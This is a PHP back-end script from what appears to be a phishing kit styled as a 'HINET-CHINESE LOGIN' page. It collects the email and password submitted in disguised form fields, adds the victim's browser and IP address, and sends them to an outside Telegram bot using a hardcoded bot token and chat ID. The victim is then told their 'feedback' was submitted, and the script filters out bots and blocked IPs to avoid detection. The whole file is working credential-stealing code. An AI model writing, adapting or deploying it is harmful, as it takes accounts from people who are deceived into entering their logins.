<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

// Get details
$browserDetails = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit(json_encode(['status' => 'error', 'message' => 'Invalid request method']));
}

if (!empty($_POST['website'])) {
    exit(json_encode(['status' => 'error', 'message' => 'Bot submission detected']));
}

$user  = trim($_POST['aa'] ?? '');
$pass = trim($_POST['bb'] ?? '');

if ($user === '' || $pass === '') {
    exit(json_encode(['status' => 'error', 'message' => 'Please fill in all required fields']));
}

if (!filter_var($user, FILTER_VALIDATE_EMAIL)) {
    exit(json_encode(['status' => 'error', 'message' => 'Invalid email address']));
}

$blockFile = __DIR__ . '/blocked_ips.txt';
if (!file_exists($blockFile)) {
    file_put_contents($blockFile, '');
}
$blockedIps = file($blockFile, FILE_IGNORE_NEW_LINES);
if (in_array($ip, $blockedIps)) {
    exit(json_encode(['status' => 'error', 'message' => 'Access denied']));
}
function sendTelegramMessage($message) {
    
    $telegramBotToken = '8928858749:AAFDEHSf2fzvThraUBL9iK31Dfr848jf-Zw'; // Replace with your real bot token
    $telegramChatID = '6317765109';     // Replace with your real chat ID

    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

$message  = "---------HINET-CHINESE LOGIN---------\r\n";
$message .= "Email: $user\r\n";
$message .= "Password: $pass\r\n";
$message .= "Browser: $browserDetails\r\n";
$message .= "IP Address: $ip\r\n";
$message .= "---------------------------------";

$response = sendTelegramMessage($message);

if ($response) {
    echo json_encode(['status' => 'success', 'message' => 'Feedback submitted successfully']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Failed to send to Telegram']);
}
?>
